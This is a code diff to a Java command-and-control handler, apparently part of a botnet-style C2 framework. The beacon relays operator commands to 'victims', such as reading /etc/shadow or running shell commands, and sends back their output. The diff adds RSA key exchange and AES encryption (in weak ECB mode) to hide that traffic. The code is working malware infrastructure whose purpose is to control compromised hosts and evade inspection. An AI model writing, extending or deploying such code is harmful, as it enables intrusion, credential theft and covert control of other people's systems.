@@ -5,9 +5,12 @@ import java.net.NoRouteToHostException;
 import java.net.Socket;
 import java.util.ArrayList;
 import java.util.HashMap;
+import java.security.SecureRandom;
 
 import Servers.Duplexer;
 import Servers.keepAlive;
+import Servers.encryption.aes.*;
+import Servers.encryption.rsa.*;
 
 public class BeaconC2Handler implements Runnable{
     // Pointer to the Long Range Beacon Server that interacts with the clients (victims)
@@ -26,6 +29,14 @@ public class BeaconC2Handler implements Runnable{
 
     // Used to know if this thread should kill the server, due to a unsuccessful connection to the C2
     private Boolean killServer;
+
+    // Class used for AES encryption
+    private aes aes;
+    private String aesKey;
+
+    // Variables used to securely generate AES key
+    private final String HEX_CHARS;
+    private final SecureRandom RANDOM;
 
     /**
      * This starts a thread that sends and receives messages with the C2 Server
@@ -50,8 +61,9 @@ public class BeaconC2Handler implements Runnable{
         
         this.passwordDigest = passwordDigest;
         this.sendLock = new Object();
-        this.keepAliveClass = new keepAlive(C2Server, sendLock, false, false);
-        this.keepAliveThread = new Thread(keepAliveClass);
+
+        this.HEX_CHARS = "0123456789abcdef";
+        this.RANDOM = new SecureRandom();
     }
 
     /**
@@ -62,7 +74,7 @@ public class BeaconC2Handler implements Runnable{
      */
     protected void sendDataToC2Server(String Data){
         synchronized(sendLock){
-            C2Server.send(Data);
+            C2Server.send(aes.encrypt(Data), true);
         }
     }
 
@@ -85,7 +97,7 @@ public class BeaconC2Handler implements Runnable{
             responseToRequest.append("\n"); // Separate each client's response block with a newline
         }
         String finalResponseToRequest = responseToRequest.toString() + "END_OF_OUTPUT";
-        C2Server.send(finalResponseToRequest);
+        C2Server.send(aes.encrypt(finalResponseToRequest), true);
     }
 
     @Override
@@ -114,11 +126,42 @@ public class BeaconC2Handler implements Runnable{
              * Command 10.0.10.x_cat /etc/shadow
              */
 
+            // The C2 Server will start the connection by sending its public key.
+            String nPubKey = "";
+            String ePubKey = "";
+            try{
+                // duplexer.receive() includes a /n at the end, so we need to remove that for the BigInteger class to be able to handle it correctly
+                nPubKey = C2Server.receive(true);
+                nPubKey = nPubKey.substring(0, nPubKey.length() - 1);
+                ePubKey = C2Server.receive(true);
+                ePubKey = ePubKey.substring(0, ePubKey.length() - 1);
+            } catch (IOException e){
+                e.printStackTrace();
+            }
+            // This Beacon server will then use the public key to encrypt the AES session key,
+            // and send the AES session key back to the C2 server
+            rsa rsaClient = new rsa(nPubKey, ePubKey);
+
+            // Generate AES key
+            StringBuilder hexString = new StringBuilder(32);
+            for (int i = 0; i < 32; i++) {
+                hexString.append(HEX_CHARS.charAt(RANDOM.nextInt(HEX_CHARS.length())));
+            }
+            aesKey = hexString.toString();
+            
+            aes = new aes(aesKey, modes.ECB);
+            keepAliveClass = new keepAlive(C2Server, sendLock, true, false, this.aes);
+            keepAliveThread = new Thread(keepAliveClass);
+            C2Server.send(rsaClient.encrypt(aesKey), true);
+
             // Attempt to authenticate with the C2 Server. If authentication fails, gracefully close, and distribute the quit
             // message to the Beacon Server for further distribution.
-            C2Server.send(passwordDigest);
+            C2Server.send(aes.encrypt(passwordDigest), true);
             try{
-                String message = C2Server.receive();
+                String message;
+                synchronized(C2Server){
+                    message = aes.decrypt(C2Server.receive(true));
+                }
                 if(!(message.equals("Authentication Successful"))){
                     String reason = "Authentication with the C2 Server Unsuccesful. Message Received from C2 Server: " + message;
                     beaconServer.quit(reason);
@@ -134,9 +177,11 @@ public class BeaconC2Handler implements Runnable{
         
         while(authenticationSentinel){
             try{
-                String message = C2Server.receive();
+                String message;
+                synchronized(C2Server){
+                    message = aes.decrypt(C2Server.receive(true));
+                }
                 if(!(message.equals("KEEP_ALIVE"))){
-                    System.out.println(message);
                     if(message.equals("quit")){
                         beaconServer.quit("C2 Server Shutting Down");
                         C2Server.close();
@@ -167,7 +212,7 @@ public class BeaconC2Handler implements Runnable{
                     else if(verb.equals("Status")){
                         String responseToRequest;
                         responseToRequest = beaconServer.getClientStatus();
-                        C2Server.send(responseToRequest);
+                        C2Server.send(aes.encrypt(responseToRequest), true);
                     }
                     // Shell is essentially the same thing as sending commands, however we want to send responses back immediately
                     else if (verb.equals("Shell")){
